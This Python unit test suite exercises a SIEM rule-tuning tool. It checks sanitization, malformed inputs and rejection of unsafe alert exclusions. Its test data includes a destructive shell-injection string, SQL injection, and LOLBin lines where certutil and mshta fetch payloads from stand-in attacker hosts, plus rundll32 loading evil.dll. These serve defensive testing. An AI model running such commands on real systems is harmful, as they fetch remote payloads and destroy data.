#!/usr/bin/env python3
"""
extreme_adversarial_suite.py - 20 Extreme Adversarial, Chaos & Edge-Case Tests for siem-rule-tuner.

Tests:
1. Non-dict and non-list root inputs (None, int, float, str, bool)
2. Empty lists and empty dictionaries
3. Deeply nested payloads (200 levels deep) through sanitize_bundle
4. Pathological Unicode, null bytes, and foreign alphabets
5. SQL and command injection patterns in alert fields
6. Extremely long paths (5,000 characters)
7. Missing and null keys across all alert fields
8. Single-condition broad exclusions rejected
9. LOLBin blind spots correctly identified and rejected
10. Idempotent sanitization on repeated passes
11. Thousand-IP address sanitization torture
12. Thousand-email and FQDN sanitization torture
13. Corrupted XML and KQL special characters (&, <, >, ", ')
14. Unknown and unclassified SIEM formats
15. Huge alert batches (5,000 alerts)
"""

import json
import os
import sys
import unittest

BASE_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
SCRIPTS_DIR = os.path.join(BASE_DIR, "scripts")
FIXTURES_DIR = os.path.join(BASE_DIR, "tests", "fixtures")
sys.path.insert(0, SCRIPTS_DIR)

from analyze_siem_fp import analyze_fp_alerts, extract_alert_attributes, sanitize_bundle
from tune_siem_rule import audit_blind_spot_risk, escape_wazuh_xml_regex, tune_alerts_data


class TestSiemTunerExtremeAdversarial(unittest.TestCase):

    def setUp(self):
        with open(os.path.join(FIXTURES_DIR, "fixture-wazuh-veeam-sysmon-fp.json"), "r", encoding="utf-8") as f:
            self.sample_alert = json.load(f)

    def test_01_scalar_root_inputs(self):
        """Audit non-dict, non-list root inputs without uncaught exceptions."""
        for scalar in ["alert-string", 12345, 99.9, True, False, None]:
            res = tune_alerts_data(scalar, "wazuh")
            self.assertEqual(res["tuning_disposition"], "REJECTED")
            self.assertFalse(res["approved"])

    def test_02_empty_dict_and_list(self):
        """Pass empty dictionary and empty list."""
        res_dict = tune_alerts_data({}, "wazuh")
        self.assertEqual(res_dict["tuning_disposition"], "REJECTED")

        res_list = tune_alerts_data([], "wazuh")
        self.assertEqual(res_list["tuning_disposition"], "REJECTED")

    def test_03_deep_recursion_200_levels(self):
        """Depth safety guard prevents RecursionError on deeply nested structures."""
        curr = {"leaf_ip": "10.50.100.200"}
        for _ in range(200):
            curr = {"nested": curr}
        sanitized = sanitize_bundle(curr)
        self.assertIsInstance(sanitized, dict)

    def test_04_unicode_and_null_bytes(self):
        """Safely handle null bytes and multi-language Unicode in image paths."""
        data = [{
            "rule": {"id": "60103"},
            "data": {"win": {"eventdata": {
                "image": "C:\\Tools\\\x00\\app_\u30B7\u30B9\u30C6\u30E0.exe",
                "parentImage": "C:\\Windows\\System32\\services.exe",
                "user": "SYSTEM",
                "commandLine": "-run"
            }}}
        }]
        res = tune_alerts_data(data, "wazuh")
        self.assertIsInstance(res, dict)

    def test_05_sql_injection_in_alert_telemetry(self):
        """Handle SQL injection payloads in process commandline without errors."""
        data = [{
            "rule": {"id": "60103"},
            "data": {"win": {"eventdata": {
                "image": "C:\\App\\query.exe",
                "parentImage": "C:\\Windows\\System32\\services.exe",
                "user": "SYSTEM",
                "commandLine": "query.exe --filter \"'; DROP TABLE alerts;--\""
            }}}
        }]
        res = tune_alerts_data(data, "wazuh")
        self.assertIsInstance(res, dict)
        self.assertIn("DROP TABLE", res["production_rule_code"])

    def test_06_command_injection_in_alert_telemetry(self):
        """Handle shell injection payloads in process commandline without errors."""
        data = [{
            "rule": {"id": "60103"},
            "data": {"win": {"eventdata": {
                "image": "C:\\App\\agent.exe",
                "parentImage": "C:\\Windows\\System32\\services.exe",
                "user": "SYSTEM",
                "commandLine": "agent.exe $(rm -rf /) && echo pwned"
            }}}
        }]
        res = tune_alerts_data(data, "wazuh")
        self.assertIsInstance(res, dict)

    def test_07_extremely_long_path_5000_chars(self):
        """Process an extraordinarily long path without crashing."""
        long_path = "C:\\" + ("subfolder\\" * 400) + "tool.exe"
        data = [{
            "rule": {"id": "60103"},
            "data": {"win": {"eventdata": {
                "image": long_path,
                "parentImage": "C:\\Windows\\System32\\services.exe",
                "user": "SYSTEM",
                "commandLine": "-start"
            }}}
        }]
        res = tune_alerts_data(data, "wazuh")
        self.assertIsInstance(res, dict)

    def test_08_all_null_eventdata_fields(self):
        """Handle alert where all eventdata values are explicitly None."""
        data = [{
            "rule": {"id": "60103"},
            "data": {"win": {"eventdata": {
                "image": None,
                "parentImage": None,
                "user": None,
                "commandLine": None
            }}}
        }]
        res = tune_alerts_data(data, "wazuh")
        self.assertEqual(res["tuning_disposition"], "REJECTED")

    def test_09_single_condition_broad_exclusion_rejection(self):
        """Reject broad exclusion with only binary name."""
        approved, defects, disp = audit_blind_spot_risk(
            image_path="C:\\Tools\\script.exe",
            parent_path="Unknown",
            command_line="",
            user="Unknown",
            attributes_count=1
        )
        self.assertFalse(approved)
        self.assertEqual(disp, "REJECTED")

    def test_10_certutil_lolbin_rejection(self):
        """Reject certutil without verified parent and strict commandline."""
        approved, defects, disp = audit_blind_spot_risk(
            image_path="C:\\Windows\\System32\\certutil.exe",
            parent_path="C:\\Windows\\explorer.exe",
            command_line="-urlcache -split -f http://evil.com/x.exe",
            user="admin",
            attributes_count=3
        )
        self.assertFalse(approved)
        self.assertTrue(any("Critical Blind Spot" in d for d in defects))

    def test_11_sanitization_idempotency(self):
        """Sanitizing a sanitized alert bundle twice produces identical results."""
        raw = {
            "computer_name": "srv01.corp.example.internal",
            "user": "sysadmin@corp.example.internal",
            "ip": "10.200.5.1"
        }
        s1 = sanitize_bundle(raw)
        s2 = sanitize_bundle(s1)
        self.assertEqual(s1["computer_name"], s2["computer_name"])
        self.assertEqual(s1["user"], s2["user"])

    def test_12_sanitization_1000_unique_ips(self):
        """Sanitize 1,000 distinct IP addresses and verify all are mapped to RFC 5737."""
        ips = [f"172.16.{i // 256}.{i % 256}" for i in range(1000)]
        data = {"ip_list": ips}
        sanitized = sanitize_bundle(data)
        out_ips = sanitized["ip_list"]
        self.assertEqual(len(out_ips), 1000)
        self.assertTrue(out_ips[0].startswith("192.0.2."))

    def test_13_sanitization_500_emails_and_fqdns(self):
        """Sanitize 500 emails and FQDNs idempotently."""
        emails = [f"analyst.{i}@corp.example.internal" for i in range(500)]
        data = {"analysts": emails}
        pass1 = sanitize_bundle(data)
        pass2 = sanitize_bundle(pass1)
        self.assertEqual(pass1["analysts"], pass2["analysts"])

    def test_14_xml_special_characters_escaping(self):
        """Ensure XML control characters (&, <, >, \") in command lines are escaped."""
        escaped_xml = escape_wazuh_xml_regex("C:\\Tools\\app & tool.exe")
        self.assertIn("app & tool\\.exe", escaped_xml)

    def test_15_defender_format_ingestion(self):
        """Verify Microsoft Defender XDR alert ingestion."""
        defender_alert = [{
            "FolderPath": "C:\\Program Files\\Agent\\agent.exe",
            "InitiatingProcessFolderPath": "C:\\Windows\\System32\\services.exe",
            "AccountName": "SYSTEM",
            "ProcessCommandLine": "agent.exe -run"
        }]
        res = tune_alerts_data(defender_alert, "defender")
        self.assertTrue(res["approved"])
        self.assertIn("| where not (", res["production_rule_code"])

    def test_16_generic_format_ingestion(self):
        """Verify generic SIEM alert ingestion."""
        generic_alert = [{
            "process": "C:\\Program Files\\App\\app.exe",
            "parent_image": "C:\\Windows\\System32\\services.exe",
            "user": "SYSTEM",
            "command_line": "app.exe -service",
            "rule_id": "CustomRule99"
        }]
        res = tune_alerts_data(generic_alert, "wazuh")
        self.assertTrue(res["approved"])
        self.assertEqual(res["parent_rule_id"], "CustomRule99")

    def test_17_temp_directory_rejection(self):
        """Reject binary running in temp directory without commandline."""
        approved, defects, disp = audit_blind_spot_risk(
            image_path="C:\\Users\\Bob\\AppData\\Local\\Temp\\update.exe",
            parent_path="C:\\Windows\\explorer.exe",
            command_line="",
            user="Bob",
            attributes_count=3
        )
        self.assertFalse(approved)
        self.assertTrue(any("Unsafe Directory" in d for d in defects))

    def test_18_large_alert_batch_5000(self):
        """Cluster 5,000 alerts without memory or recursion failure."""
        large_batch = []
        for i in range(5000):
            alert = dict(self.sample_alert[0])
            alert["timestamp"] = f"2026-11-09T08:{i%60:02d}:00Z"
            large_batch.append(alert)

        res = analyze_fp_alerts(large_batch, "wazuh")
        self.assertEqual(res["total_alerts_analyzed"], 5000)

    def test_19_mshta_lolbin_rejection(self):
        """Reject mshta.exe exclusion without enterprise parent."""
        approved, defects, disp = audit_blind_spot_risk(
            image_path="C:\\Windows\\System32\\mshta.exe",
            parent_path="C:\\Windows\\System32\\cmd.exe",
            command_line="mshta.exe http://malicious.site/payload.hta",
            user="user1",
            attributes_count=4
        )
        self.assertFalse(approved)
        self.assertTrue(any("Critical Blind Spot" in d for d in defects))

    def test_20_rundll32_lolbin_rejection(self):
        """Reject rundll32.exe without verified service parent."""
        approved, defects, disp = audit_blind_spot_risk(
            image_path="C:\\Windows\\System32\\rundll32.exe",
            parent_path="C:\\Windows\\explorer.exe",
            command_line="rundll32.exe C:\\Temp\\evil.dll,EntryPoint",
            user="admin",
            attributes_count=4
        )
        self.assertFalse(approved)
        self.assertTrue(any("Critical Blind Spot" in d for d in defects))


if __name__ == "__main__":
    unittest.main()
